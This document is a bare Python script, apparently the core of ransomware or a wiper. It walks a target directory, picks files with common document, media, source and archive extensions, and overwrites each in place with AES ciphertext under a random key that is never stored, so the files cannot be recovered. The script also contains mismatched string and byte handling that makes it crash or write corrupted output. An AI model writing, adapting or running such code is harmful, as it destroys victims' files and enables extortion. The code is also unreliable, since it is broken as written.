import random
import string
import Crypto
import Crypto.Random
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import threading
import os
import sys
from os import walk
import multiprocessing
import secrets

encryption_timeout = int(sys.argv[2])
encrypted_symbol = "enc_"
ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
base_path = sys.argv[1]

def Encrypt(fileToEncrypt, iv, aes_obj):
    file_size = str(os.path.getsize(fileToEncrypt)).zfill(16)
    encrypted = ""
    with open(fileToEncrypt, 'rb') as infile:
        encrypted = encrypted + file_size
        encrypted = encrypted + iv
        while True:
            chunk = infile.read(64 * 1024)
            if len(chunk) == 0:
                break
            elif len(chunk) % 16 != 0:
                chunk += b' ' * (16 - (len(chunk) % 16))
            encrypted = encrypted + str(aes_obj.encrypt(chunk))
    return encrypted

def EncryptFile(fileToEncrypt, key):
    file_size = str(os.path.getsize(fileToEncrypt)).zfill(16)
    dir_path, file_name = os.path.split(fileToEncrypt)
    
    iv = secrets.token_bytes(16)
    aes_obj = AES.new(key, AES.MODE_CBC, iv)

    encrypted_content = Encrypt(fileToEncrypt, iv, aes_obj)

    with open(fileToEncrypt, 'wb') as outfile:
        outfile.write(encrypted_content.encode())

def EncryptAllFiles(filesToEncrypt, key):
    for file_to_encrypt in filesToEncrypt:
        EncryptFile(file_to_encrypt, key)

def GetAllFiles(dirName):
    listOfFile = os.listdir(dirName)
    allFiles = list()
    for entry in listOfFile:
        fullPath = os.path.join(dirName, entry)
        if os.path.isdir(fullPath):
            allFiles = allFiles + GetAllFiles(fullPath)
        else:
            if fullPath.endswith(ext):
                allFiles.append(fullPath)
    return allFiles

def StartEncryption():
    files_to_encrypt = GetAllFiles(base_path)
    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
    key = SHA256.new(password.encode('utf-8')).digest()
    EncryptAllFiles(files_to_encrypt, key)

###################### main ######################

enc_thread = multiprocessing.Process(target=StartEncryption)
enc_thread.daemon = True
enc_thread.start()
enc_thread.join(encryption_timeout)

if enc_thread.is_alive():
    print("terminated")
    enc_thread.terminate()
    enc_thread.join()
